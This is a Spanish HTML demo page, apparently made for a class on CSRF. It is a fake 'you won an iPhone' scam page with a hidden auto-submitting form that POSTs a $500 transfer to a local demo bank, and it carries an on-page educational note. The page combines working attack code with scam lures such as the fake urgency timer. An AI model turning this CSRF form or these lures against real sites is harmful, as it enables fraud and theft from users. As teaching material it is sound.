<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéâ ¬°FELICIDADES! Has ganado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
            background-size: 400% 400%;
            animation: gradient 3s ease infinite;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            position: relative;
        }
        
        .confetti {
            font-size: 40px;
            animation: bounce 0.5s infinite alternate;
        }
        
        @keyframes bounce {
            from { transform: translateY(0); }
            to { transform: translateY(-10px); }
        }
        
        h1 {
            color: #e74c3c;
            font-size: 32px;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .iphone {
            font-size: 100px;
            margin: 20px 0;
            animation: shake 0.5s infinite;
        }
        
        @keyframes shake {
            0%, 100% { transform: rotate(-5deg); }
            50% { transform: rotate(5deg); }
        }
        
        .subtitle {
            color: #27ae60;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        .fake-button {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            box-shadow: 0 5px 20px rgba(39, 174, 96, 0.4);
            transition: transform 0.2s;
        }
        
        .fake-button:hover {
            transform: scale(1.05);
        }
        
        .timer {
            background: #e74c3c;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            margin-top: 20px;
            display: inline-block;
        }
        
        .small-text {
            font-size: 10px;
            color: #999;
            margin-top: 30px;
        }
        
        /* ========================================
           üö® FORMULARIO OCULTO - ATAQUE CSRF üö®
           ======================================== */
        .hidden-form {
            position: absolute;
            left: -9999px;
            visibility: hidden;
        }
        
        /* Indicador educativo */
        .educational-note {
            background: #2c3e50;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: left;
            font-size: 12px;
        }
        
        .educational-note h3 {
            color: #e74c3c;
            margin-bottom: 10px;
        }
        
        .educational-note code {
            background: #1a252f;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="confetti">üéä üéâ üéä</div>
        
        <h1>¬°¬°¬°FELICIDADES!!!</h1>
        
        <div class="iphone">üì±</div>
        
        <p class="subtitle">¬°Has ganado un iPhone 15 Pro!</p>
        
        <p>Eres el visitante n√∫mero <strong>1,000,000</strong></p>
        
        <button class="fake-button" onclick="reclamarPremio()">
            üéÅ ¬°RECLAMAR MI PREMIO!
        </button>
        
        <div class="timer">
            ‚è∞ Oferta expira en: <span id="countdown">2:59</span>
        </div>
        
        <p class="small-text">
            * Sin compromiso. Solo paga env√≠o de $999.
        </p>
        
        <!-- ==========================================
             üö® FORMULARIO CSRF OCULTO üö®
             Este formulario se env√≠a autom√°ticamente
             al banco cuando el usuario hace clic
             ========================================== -->
        <form id="csrf-form" class="hidden-form" 
              action="http://localhost:8080/transferir" 
              method="POST">
            <input type="hidden" name="destino" value="HACKER-666-CUENTA-MALICIOSA">
            <input type="hidden" name="monto" value="500">
        </form>
        
        <!-- Nota educativa para la exposici√≥n -->
        <div class="educational-note">
            <h3>‚ö†Ô∏è NOTA EDUCATIVA - CSRF</h3>
            <p>Este sitio contiene un <strong>formulario oculto</strong> que hace un POST a:</p>
            <p><code>http://localhost:8080/transferir</code></p>
            <p style="margin-top: 10px;">
                Cuando el usuario hace clic en "Reclamar Premio", el formulario oculto 
                se env√≠a usando las cookies del banco (si el usuario est√° logueado).
            </p>
            <p style="margin-top: 10px; color: #e74c3c;">
                <strong>El banco transfiere $500 sin que el usuario lo sepa.</strong>
            </p>
        </div>
    </div>
    
    <script>
        // Countdown falso para crear urgencia
        let time = 179;
        setInterval(() => {
            time--;
            if (time < 0) time = 179;
            const min = Math.floor(time / 60);
            const sec = time % 60;
            document.getElementById('countdown').textContent = 
                `${min}:${sec.toString().padStart(2, '0')}`;
        }, 1000);
        
        // üö® FUNCI√ìN QUE EJECUTA EL ATAQUE CSRF
        function reclamarPremio() {
            // Mostrar alerta educativa
            alert('üö® ¬°ATAQUE CSRF EJECUTADO!\n\n' +
                  'Se ha enviado una transferencia de $500 a la cuenta del hacker.\n\n' +
                  'Revisa tu saldo en el Banco Poli.');
            
            // Enviar el formulario oculto al banco
            document.getElementById('csrf-form').submit();
        }
    </script>
</body>
</html>
